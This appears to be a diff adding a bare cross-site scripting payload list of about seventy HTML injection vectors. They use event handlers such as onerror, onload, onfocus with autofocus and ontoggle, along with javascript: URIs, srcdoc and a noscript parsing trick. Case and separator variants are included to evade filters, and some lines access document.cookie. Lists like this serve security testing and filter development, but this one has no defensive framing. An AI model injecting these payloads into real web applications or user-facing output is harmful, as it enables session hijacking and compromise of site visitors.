@@ -1,0 +1,70 @@
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<IMG SRC=x ONERROR=alert(1)>
+<ImG SrC=x OnErRoR=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<svg onload=alert(1)>
+<SVG ONLOAD=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>x</a>
+<iframe onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc='<script>alert(1)</script>'>
+<input onfocus=alert(1) autofocus>
+<input autofocus onfocus=alert(1)>
+<input onchange=alert(1)>
+<input oninput=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<button onclick=alert(1)>X</button>
+<button ondblclick=alert(1)>X</button>
+<button oncontextmenu=alert(1)>X</button>
+<button onmouseover=alert(1)>X</button>
+<a href=# onclick=alert(1)>click</a>
+<a href=javascript:alert(1)>click</a>
+<a onmouseover=alert(1)>hover</a>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<source onerror=alert(1)>
+<form><button formaction=javascript:alert(1)>X
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<marquee onstart=alert(1)>
+<style onload=alert(1)></style>
+<xss onfocusin=alert(1) autofocus tabindex=1>
+<p oncontextmenu=alert(1)>right-click</p>
+<div onwheel=alert(1)>scroll</div>
+<span onpointerover=alert(1)>hover</span>
+<span onanimationstart=alert(1) style=animation:x>x</span>
+<span ontransitionend=alert(1) style="transition:color 0.1s" onmouseover=this.style.color="red">hover</span>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<body oncut=alert(1)>
+<body oncopy=alert(1)>
+<body onpaste=alert(1)>
+<body onbeforeunload=alert(1)>
+<body onunload=alert(1)>
+<body onmessage=alert(1)>
+<body ononline=alert(1)>
+<body onoffline=alert(1)>
+<div ondragend=alert(1) draggable=true>drag</div>
+<input type=file onchange=alert(1)>
+<input type=range oninput=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<table onmouseover=alert(1)>
+<tr onmouseover=alert(1)>
+<td onmouseover=alert(1)>
+<fieldset onmouseover=alert(1)>
+<video><source onerror=alert(1)>
+<picture><source onerror=alert(1) srcset=x>
+<progress onmouseover=alert(1)>
+<meter onmouseover=alert(1)>
+<output onmouseover=alert(1)>
+<frame src=javascript:alert(1)>
+<frameset onload=alert(1)>
